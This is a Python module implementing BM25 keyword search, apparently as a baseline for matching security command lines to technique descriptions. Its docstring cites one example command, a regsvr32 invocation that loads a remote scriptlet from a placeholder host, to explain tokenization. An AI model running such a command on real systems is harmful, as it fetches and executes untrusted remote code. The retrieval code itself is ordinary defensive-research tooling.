"""BM25, in pure Python.

This is the baseline that did not exist. The dense channel only means something
next to a lexical one, so this has to be a fair implementation rather than a
strawman: standard Okapi BM25 (k1=1.5, b=0.75), a small stopword list, and a
crude plural fold. No dependencies, so it works on a bare install.

Command lines are the awkward input. ``regsvr32.exe /s /u /i:http://x/a.sct``
should still match a description that says "Regsvr32", so tokens split on
anything that is not a letter or digit.
"""

from __future__ import annotations

import math
import re
from collections import Counter

_TOKEN_RE = re.compile(r"[a-z0-9]+")

_STOPWORDS = frozenset(
    """a an and are as at be but by can for from has have in into is it its of on or
    such that the their them then there these they this to was were which will with
    may also other used use using via through within been being more most some
    adversaries adversary""".split()
)

# Kept short and boring. A stemmer would help both channels' comparison less than
# it would blur which one is doing the work.
_MIN_STEM_LEN = 4


def tokenize(text: str) -> list[str]:
    tokens: list[str] = []
    for raw in _TOKEN_RE.findall(text.lower()):
        if raw in _STOPWORDS:
            continue
        if len(raw) > _MIN_STEM_LEN and raw.endswith("s") and not raw.endswith("ss"):
            raw = raw[:-1]
        tokens.append(raw)
    return tokens


class BM25:
    def __init__(self, docs: dict[str, str], *, k1: float = 1.5, b: float = 0.75) -> None:
        self._k1 = k1
        self._b = b
        self._tf: dict[str, Counter[str]] = {}
        self._len: dict[str, int] = {}
        self._postings: dict[str, list[str]] = {}
        for doc_id, text in docs.items():
            counts = Counter(tokenize(text))
            self._tf[doc_id] = counts
            self._len[doc_id] = sum(counts.values())
            for term in counts:
                self._postings.setdefault(term, []).append(doc_id)
        self._n = len(docs)
        self._avg_len = (sum(self._len.values()) / self._n) if self._n else 0.0

    def _idf(self, term: str) -> float:
        df = len(self._postings.get(term, ()))
        # The +1 inside the log keeps idf positive for terms in most documents.
        return math.log(1.0 + (self._n - df + 0.5) / (df + 0.5))

    def search(self, query: str, *, k: int = 10, allowed: set[str] | None = None) -> list[tuple[str, float]]:
        scores: dict[str, float] = {}
        for term in set(tokenize(query)):
            postings = self._postings.get(term)
            if not postings:
                continue
            idf = self._idf(term)
            for doc_id in postings:
                if allowed is not None and doc_id not in allowed:
                    continue
                tf = self._tf[doc_id][term]
                norm = 1.0 - self._b + self._b * (self._len[doc_id] / self._avg_len if self._avg_len else 0.0)
                scores[doc_id] = scores.get(doc_id, 0.0) + idf * (tf * (self._k1 + 1.0)) / (tf + self._k1 * norm)
        # Ties break on id so a ranking is reproducible, which a benchmark needs.
        ranked = sorted(scores.items(), key=lambda item: (-item[1], item[0]))
        return ranked[:k]
